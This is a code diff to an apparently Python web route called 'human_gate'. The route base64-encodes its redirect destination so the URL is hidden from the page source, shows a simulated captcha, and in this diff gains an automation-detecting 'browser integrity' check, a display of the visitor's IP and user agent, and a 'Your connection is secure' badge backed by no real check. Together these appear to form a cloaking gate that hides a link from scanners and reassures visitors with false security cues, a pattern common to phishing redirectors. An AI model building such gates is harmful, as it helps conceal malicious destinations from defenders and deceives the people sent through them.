@@ -84,10 +84,16 @@ async def human_gate():
     # This ensures the raw URL is not visible in the HTML source until decoded
     encoded_url = base64.b64encode(final_destination.encode('utf-8')).decode('utf-8')
 
+    # Capture User Info for Display
+    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    user_agent = request.headers.get('User-Agent', 'Unknown')
+
     # HTML Template (Blue/Green Theme requested by user)
     # Includes:
     # - Simulated "Real" Captcha (CSS/JS)
-    # - No Browser Check (Requested to be removed)
+    # - Browser Integrity Check (JS)
+    # - User IP & Device Info Display
+    # - "Secure Connection" indicator
     # - Direct Redirect Logic (Base64 decode -> window.location)
     html_content = """
 <!DOCTYPE html>
@@ -115,6 +121,7 @@ body {
   width: 340px;
   text-align: center;
   box-shadow: 0 15px 40px rgba(0,0,0,.2);
+  position: relative;
 }
 
 /* Titles */
@@ -261,6 +268,30 @@ button#continueBtn.active:hover {
   background: #1d4ed8;
 }
 
+/* Footer Info */
+.info-footer {
+  margin-top: 25px;
+  border-top: 1px solid #f3f4f6;
+  padding-top: 15px;
+  font-size: 0.75rem;
+  color: #9ca3af;
+  text-align: center;
+}
+.secure-badge {
+  color: #059669;
+  font-weight: 500;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 5px;
+  margin-bottom: 8px;
+}
+.device-info {
+  font-family: monospace;
+  font-size: 0.7rem;
+  opacity: 0.7;
+  word-break: break-all;
+}
 </style>
 </head>
 
@@ -273,6 +304,7 @@ button#continueBtn.active:hover {
     <h2>Checking Security</h2>
     <p>Please wait…</p>
     <div class="loader"><span></span></div>
+    <div style="margin-top:10px; font-size:12px; color:#999;">Verifying Browser Integrity...</div>
   </div>
 
   <!-- STEP 2: CAPTCHA VERIFICATION -->
@@ -301,6 +333,15 @@ button#continueBtn.active:hover {
     </div>
 
     <button id="continueBtn">Click here to verify</button>
+
+    <div class="info-footer">
+      <div class="secure-badge">
+        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
+        Your connection is secure
+      </div>
+      <div>IP: {{ client_ip }}</div>
+      <div class="device-info">{{ user_agent }}</div>
+    </div>
   </div>
 
 </div>
@@ -309,10 +350,28 @@ button#continueBtn.active:hover {
   let captchaSolved = false;
   const encodedUrl = "{{ encoded_url }}";
 
-  // 1. Initial Loading Timer (3 Seconds)
+  // Browser Verification Logic
+  function checkBrowser() {
+    // Basic bot checks
+    if (navigator.webdriver) {
+      console.warn("Automation detected");
+      // You can choose to fail here or just warn
+    }
+    // Check for essential navigator properties
+    if (!navigator.userAgent || !navigator.language) {
+      return false;
+    }
+    return true;
+  }
+
+  // 1. Initial Loading Timer + Verification (3 Seconds)
   setTimeout(() => {
-    document.getElementById("loading").style.display = "none";
-    document.getElementById("verify").style.display = "block";
+    if (checkBrowser()) {
+        document.getElementById("loading").style.display = "none";
+        document.getElementById("verify").style.display = "block";
+    } else {
+        document.getElementById("loading").innerHTML = "<h2>Verification Failed</h2><p>Browser security check failed.</p>";
+    }
   }, 3000);
 
   // 2. Captcha Logic
@@ -359,7 +418,7 @@ button#continueBtn.active:hover {
 </body>
 </html>
     """
-    return await render_template_string(html_content, encoded_url=encoded_url)
+    return await render_template_string(html_content, encoded_url=encoded_url, client_ip=client_ip, user_agent=user_agent)
 
 
 @app.route('/verify/<request_id>')
